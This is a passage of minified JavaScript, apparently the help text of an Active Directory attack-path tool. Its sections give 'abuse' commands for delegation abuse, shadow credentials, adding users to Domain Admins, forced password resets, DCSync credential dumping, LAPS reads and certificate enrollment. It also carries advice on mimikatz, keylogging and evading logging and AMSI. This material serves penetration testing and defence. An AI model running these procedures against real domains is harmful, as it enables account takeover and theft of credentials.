noreferrer",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",children:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota"})]}),kl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}),Tl={general:vl,windowsAbuse:kl,linuxAbuse:Al,opsec:Sl,references:Cl},Pl=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(t,{variant:"body2",children:[E(a,r),' the ability to write to the "msds-KeyCredentialLink" property on ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.']}),Dl=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}),Ol=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing the attack will generate a 5136 (A directory object was modified) event at the domain controller if an appropriate SACL is in place on the target object."}),e.jsx(t,{variant:"body2",children:"If PKINIT is not common in the environment, a 4768 (Kerberos authentication ticket (TGT) was requested) ticket can also expose the attacker."})]}),Rl=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/eladshamir/Whisker",children:"https://github.com/eladshamir/Whisker"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",children:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"})]}),El=({sourceName:r,sourceType:a})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse this permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."})]}),Il={general:Pl,windowsAbuse:El,linuxAbuse:Dl,opsec:Ol,references:Rl},$l=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the ability to add arbitrary principals, including"," ",a==="Group"?"themselves":"itself",", to the group ",o,". Because of security group delegation, the members of a security group have the same privileges as that group."]}),e.jsxs(t,{variant:"body2",children:["By adding itself to the group, ",r," will gain the same privileges that ",o," already has."]})]}),Gl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]}),Nl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),e.jsx(t,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity."}),e.jsx(t,{variant:"body2",children:"You may be able to completely evade those features by downgrading to PowerShell v2."})]}),Ml=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"})]}),Ll=({sourceName:r,sourceType:a})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsx(t,{variant:"body2",children:"To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as"," ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]}),Fl={general:$l,windowsAbuse:Ll,linuxAbuse:Gl,opsec:Nl,references:Ml},_l=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the ability to add"," ",a==="Group"?"themselves":"itself",", to the group ",o,". Because of security group delegation, the members of a security group have the same privileges as that group."]}),e.jsxs(t,{variant:"body2",children:["By adding itself to the group, ",r," will gain the same privileges that ",o," already has."]})]}),Ul=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]}),Wl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),e.jsx(t,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity."}),e.jsx(t,{variant:"body2",children:"You may be able to completely evade those features by downgrading to PowerShell v2."})]}),Bl=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl#bloodhound-edges",children:"https://www.thehacker.recipes/ad/movement/dacl#bloodhound-edges"})]}),ql=({sourceName:r,sourceType:a})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console."," "]}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as"," ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]}),Kl={general:_l,windowsAbuse:ql,linuxAbuse:Ul,opsec:Wl,references:Bl},zl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Lateral movement"}),e.jsx(t,{variant:"body2",children:`There are several ways to pivot to a Windows system. If using Cobalt Strike's beacon, check the help info for the commands "psexec", "psexec_psh", "wmi", and "winrm". With Empire, consider the modules for Invoke-PsExec, Invoke-DCOM, and Invoke-SMBExec. With Metasploit, consider the modules "exploit/windows/smb/psexec", "exploit/windows/winrm/winrm_script_exec", and "exploit/windows/local/ps_wmi_exec". With Impacket, consider the example scripts psexec/wmiexec/smbexec/atexec/dcomexec. There are other alternatives like evil-winrm and crackmapexec. Additionally, there are several manual methods for remotely executing code on the machine, including via RDP, with the service control binary and interaction with the remote machine's service control manager, and remotely instantiating DCOM objects. For more information about these lateral movement techniques, see the References tab.`}),e.jsx(t,{variant:"body1",children:"Gathering credentials"}),e.jsx(t,{variant:"body2",children:"The most well-known tool for gathering credentials from a Windows system is mimikatz. mimikatz is built into several agents and toolsets, including Cobalt Strike's beacon, Empire, and Meterpreter. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system."}),e.jsx(t,{variant:"body2",children:`You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's "keyscan_start" command to start keylogging a user, then "keyscan_dump" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard.`}),e.jsx(t,{variant:"body1",children:"Token Impersonation"}),e.jsx(t,{variant:"body2",children:"You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab."}),e.jsx(t,{variant:"body1",children:"Disabling host-based security controls"}),e.jsx(t,{variant:"body2",children:"Several host-based controls may affect your ability to execute certain techniques, such as credential theft, process injection, command line execution, and writing files to disk. Administrators can often disable these host-based controls in various ways, such as stopping or otherwise disabling a service, unloading a driver, or making registry key changes. For more information, see the References tab."})]}),Hl=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," admin rights to the computer ",o,"."]}),e.jsx(t,{variant:"body2",children:"By default, administrators have several ways to perform remote code execution on Windows systems, including via RDP, WMI, WinRM, the Service Control Manager, and remote DCOM execution."}),e.jsx(t,{variant:"body2",children:"Further, administrators have several options for impersonating other users logged onto the system, including plaintext password extraction, token impersonation, and injecting into processes running as another user."}),e.jsx(t,{variant:"body2",children:"Finally, administrators can often disable host-based security controls that would otherwise prevent the aforementioned techniques."})]}),Vl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several forensic artifacts generated by the techniques described above. For instance, lateral movement via PsExec will generate 4697 events on the target system. If the target organization is collecting and analyzing those events, they may very easily detect lateral movement via PsExec."}),e.jsx(t,{variant:"body2",children:"Additionally, an EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when abusing administrator privileges. For more information, see the References tab."})]}),Yl=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(t,{variant:"body1",children:"Lateral movement"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/wiki/Lateral_Movement",children:"https://attack.mitre.org/wiki/Lateral_Movement"}),e.jsx(t,{variant:"body1",children:"Gathering Credentials"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://blog.gentilkiwi.com/mimikatz",children:"http://blog.gentilkiwi.com/mimikatz"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/gentilkiwi/mimikatz",children:"https://github.com/gentilkiwi/mimikatz"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?page_id=1821",children:"https://adsecurity.org/?page_id=1821"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/wiki/Credential_Access",children:"https://attack.mitre.org/wiki/Credential_Access"}),e.jsx(t,{variant:"body1",children:"Token Impersonation"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.exploit-db.com/docs/english/13054-security-implications-of-windows-access-tokens.pdf",children:"https://www.exploit-db.com/docs/english/13054-security-implications-of-windows-access-tokens.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/wiki/Technique/T1134",children:"https://attack.mitre.org/wiki/Technique/T1134"}),e.jsx(t,{variant:"body1",children:"Disabling host-based security controls"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/",children:"https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/",children:"https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/"}),e.jsx(t,{variant:"body1",children:"Opsec Considerations"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/",children:"https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/"})]}),Ql={general:Hl,abuse:zl,opsec:Vl,references:Yl},Jl=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the AllExtendedRights permission to the"," ",N(i)," ",o,"."]}),e.jsx(t,{variant:"body2",children:"Extended rights are special rights granted on objects which allow reading of privileged attributes, as well as performing special actions."})]}),Xl=({sourceName:r,targetName:a,targetType:o})=>{switch(o){case"User":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," the ability to change the password of the user ",a,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'})]});case"Computer":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission allows ",r," to retrieve the LAPS (RID 500 administrator) password for ",a,"."]}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:"}),e.jsx(t,{component:"pre",children:"bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"}),e.jsx(t,{variant:"body2",children:"See Windows abuse for retrieving and decrypting the encrypted attributes."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"DCSync"}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",a,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"})]});case"CertTemplate":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," enrollment rights on the certificate template ",a,"."]}),e.jsx(t,{variant:"body2",children:"Certipy can be used to enroll a certificate:"}),e.jsx(t,{component:"pre",children:"certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE"}),e.jsxs(t,{variant:"body2",children:["The following additional requirements must be met for a principal to be able to enroll a certificate:",e.jsx("br",{}),"1) The certificate template is published on an enterprise CA",e.jsx("br",{}),"2) The principal has Enroll permission on the enterprise CA",e.jsx("br",{}),"3) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template"]})]});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},Zl=()=>e.jsx(t,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),ed=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword",children:"https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/CravateRouge/bloodyAD",children:"https://github.com/CravateRouge/bloodyAD"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ly4k/Certipy",children:"https://github.com/ly4k/Certipy"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Certify",children:"https://github.com/GhostPack/Certify"})]}),td=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>{switch(i){case"User":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," the ability to change the password of the user ",o,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
